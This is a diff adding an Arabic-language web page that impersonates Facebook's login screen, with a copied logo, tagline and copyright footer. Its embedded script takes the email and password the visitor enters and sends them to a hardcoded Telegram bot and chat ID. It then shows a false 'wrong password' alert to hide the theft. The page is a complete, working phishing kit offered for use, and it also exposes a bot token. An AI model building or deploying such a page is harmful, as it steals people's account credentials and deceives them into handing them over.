@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة تسجيل دخول</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 10px;
+        }
+
+        .left {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .left h1 {
+            font-size: 40px;
+            color: #1877f2;
+            margin-bottom: 10px;
+        }
+
+        .left p {
+            font-size: 18px;
+            color: #333;
+            margin: 0;
+        }
+
+        .right {
+            width: 100%;
+            max-width: 400px;
+            background: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .right input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .right button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .right button:hover {
+            background-color: #145dbf;
+        }
+
+        .right a {
+            text-decoration: none;
+            display: block;
+            text-align: center;
+            margin: 10px 0;
+            color: #1877f2;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #555;
+            margin-top: 20px;
+        }
+
+        /* استجابة للشاشات الصغيرة */
+        @media (max-width: 768px) {
+            .left h1 {
+                font-size: 30px;
+            }
+
+            .left p {
+                font-size: 16px;
+            }
+
+            .right {
+                width: 90%;
+            }
+
+            .right input, .right button {
+                font-size: 14px;
+                padding: 8px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .left h1 {
+                font-size: 24px;
+            }
+
+            .left p {
+                font-size: 14px;
+            }
+
+            .right {
+                padding: 10px;
+            }
+
+            .right input, .right button {
+                font-size: 12px;
+                padding: 6px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- الجزء الأيسر -->
+        <div class="left">
+            <h1>facebook</h1>
+            <p>يساعدك فيسبوك على التواصل مع الأشخاص ومشاركة حياتك.</p>
+        </div>
+
+        <!-- الجزء الأيمن -->
+        <div class="right">
+            <form id="loginForm">
+                <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                <input type="password" id="password" placeholder="كلمة المرور" required>
+                <button type="submit">تسجيل الدخول</button>
+                <a href="#">هل نسيت كلمة المرور؟</a>
+                <hr>
+                <button type="button" style="background-color: #42b72a;">إنشاء حساب جديد</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- تذييل الصفحة -->
+    <div class="footer">
+        © 2024 فيسبوك. جميع الحقوق محفوظة.
+    </div>
+
+    <script>
+        const botToken = "7313277524:AAFPzkl5iXAlNfq5LiM7_OlBVHPkmk-ydpg"; // ضع توكن البوت هنا
+        const chatId = "5965289737"; // ضع معرف الدردشة الخاصة بك
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // جمع البيانات
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // إعداد الرسالة
+            const message = `تسجيل دخول جديد:\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`;
+
+            // إرسال البيانات إلى تلجرام
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).then(response => {
+                if (response.ok) {
+                    alert("كلمة المرور خطأ");
+                } else {
+                    alert("حدث خطأ أثناء الإرسال.");
+                }
+            }).catch(error => {
+                alert("تعذر الاتصال بالخادم.");
+                console.error(error);
+            });
+        });
+    </script>
+</body>
+</html>
